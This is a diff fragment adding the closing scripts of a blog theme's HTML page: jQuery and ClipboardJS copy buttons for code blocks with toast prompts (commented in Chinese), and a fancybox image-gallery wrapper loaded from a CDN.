+      $(".highlight .code pre").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+
+      clipboard.on('success', function(e) {
+        //您可以加入成功提示
+        console.info('Action:', e.action);
+        console.info('Text:', e.text);
+        console.info('Trigger:', e.trigger);
+        success_prompt(COPY_SUCCESS);
+        e.clearSelection();
+      });
+      clipboard.on('error', function(e) {
+        //您可以加入失败提示
+        console.error('Action:', e.action);
+        console.error('Trigger:', e.trigger);
+        fail_prompt(COPY_FAILURE);
+      });
+    }
+    initCopyCode();
+
+  }(window, document);
+
+  /**
+   * 弹出式提示框，默认1.5秒自动消失
+   * @param message 提示信息
+   * @param style 提示样式，有alert-success、alert-danger、alert-warning、alert-info
+   * @param time 消失时间
+   */
+  var prompt = function (message, style, time)
+  {
+      style = (style === undefined) ? 'alert-success' : style;
+      time = (time === undefined) ? 1500 : time*1000;
+      $('<div>')
+          .appendTo('body')
+          .addClass('alert ' + style)
+          .html(message)
+          .show()
+          .delay(time)
+          .fadeOut();
+  };
+
+  // 成功提示
+  var success_prompt = function(message, time)
+  {
+      prompt(message, 'alert-success', time);
+  };
+
+  // 失败提示
+  var fail_prompt = function(message, time)
+  {
+      prompt(message, 'alert-danger', time);
+  };
+
+  // 提醒
+  var warning_prompt = function(message, time)
+  {
+      prompt(message, 'alert-warning', time);
+  };
+
+  // 信息提示
+  var info_prompt = function(message, time)
+  {
+      prompt(message, 'alert-info', time);
+  };
+
+</script>
+
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  let LAZY_LOAD_IMAGE = "";
+  $(".article-entry").find("fancybox").find("img").each(function () {
+      var element = document.createElement("a");
+      $(element).attr("data-fancybox", "gallery");
+      $(element).attr("href", $(this).attr("src"));
+      /* 图片采用懒加载处理时,
+       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
+       * 那么此处将原本的属性名src替换为对应属性名data-original,
+       * 修改如下
+       */
+       if (LAZY_LOAD_IMAGE) {
+         $(element).attr("href", $(this).attr("data-original"));
+       }
+      $(this).wrap(element);
+  });
+</script>
+
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
